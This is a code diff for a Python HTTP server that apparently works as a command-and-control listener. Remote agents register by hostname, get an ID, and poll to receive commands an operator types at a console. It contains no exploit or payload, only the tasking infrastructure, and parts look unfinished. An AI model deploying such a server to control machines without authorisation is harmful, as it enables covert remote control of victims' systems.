@@ -4,11 +4,11 @@ import threading
 import urllib.parse
 from typing import TypedDict, Optional
 from concurrent_collections import ConcurrentDictionary
-import datetime
-from datetime import timezone
+from datetime import datetime, timezone
 import secrets
 import string
 import hmac
+from components import component
 
 # 1. Define the Host Record Structure (Type Hinting + Default Factory)
 class HostRecord(TypedDict):
@@ -16,13 +16,20 @@ class HostRecord(TypedDict):
     status: str
     last_seen: Optional[str]
     command: Optional[str]
-main_console = "Command (type 'exit to stop:) >"
-def get_user_input():
-    global user_input
+main_console = "Command (type 'exit to stop:) > "
+
+def get_user_input(user_input):
+    global server_command
     while True:
-        user_input = input(f"{main_console}")
-        if user_input.lower() == "exit":
+        
+        server_command = input(main_console).strip()
+
+        if not component.handle_command(server_command, user_input):
+            print("Shutting down...")
             break
+        server_command = ""
+             
+
 
 #Disable all the logs from the http.server
 class NoLogRequestHandler(SimpleHTTPRequestHandler):
@@ -45,16 +52,16 @@ class MyRequestHandler(NoLogRequestHandler):
             uuid = self.generate_short_agent_id()
             host_record = self.create_host_record(uuid)
             self.upsert_host(hostname, uuid)
-            self.collective_handle(hostname)
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.send_header('Authorization', user_input.get(hostname, {}).get("uuid"))
-        self.end_headers()
+            #self.collective_handle(hostname)
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
+            self.send_header('Authorization', user_input.get(hostname, {}).get("uuid"))
+            self.end_headers()
         
 
     def do_POST(self):
         # 1. Extract and strip whitespace from headers
-        hostname = self.headers.get("hostname", "").strip()
+        hostname = self.headers.get("host-name", "").strip()
         auth_header = self.headers.get("Authorization", "").strip()
 
         # Optional: Strip 'Bearer ' prefix if you sent 'Bearer <uuid>' earlier
@@ -79,8 +86,9 @@ class MyRequestHandler(NoLogRequestHandler):
         #Process the data (ex: handling plain text or json)
         #if the client send text or json
         body_string = body_byte.decode('utf-8')
-        print(f"\nRecieved POST payload: {body_string}\n{main_console}")
-        self.collective_handle()
+        if body_string.strip():
+            print(f"\nRecieved POST payload from Hostname {hostname}: {body_string}\n{main_console}")
+        self.collective_handle(hostname)
         
 
     def collective_handle(self, hostname):
@@ -90,7 +98,9 @@ class MyRequestHandler(NoLogRequestHandler):
         self.send_header('Content-type', 'text/plain')
         self.send_header('Authorization', user_input.get(hostname, {}).get("uuid"))
         self.end_headers()
-        self.wfile.write(bytes(user_input.get(hostname, {}).get("command"), 'utf-8'))
+        command = user_input.get(hostname, {}).get("command")
+        if isinstance(command, str) and command.strip():
+            self.wfile.write(bytes(command, 'utf-8'))
         self.upsert_host(hostname, command= "")
 
     def unauthorized_request(self, status_code=401):
@@ -152,7 +162,7 @@ if __name__ == "__main__":
     try:
         port = 8000
         server_address = ("", port)
-        user_input = ""
+        server_command = ""
         user_input = ConcurrentDictionary()
 
         #create a an HTTP server with the custom request handler
@@ -163,7 +173,7 @@ if __name__ == "__main__":
         thread.start()
 
         #start the user input loop
-        get_user_input()
+        get_user_input(user_input)
 
         #stop the server when the user input loop is existed
         httpd.shutdown()
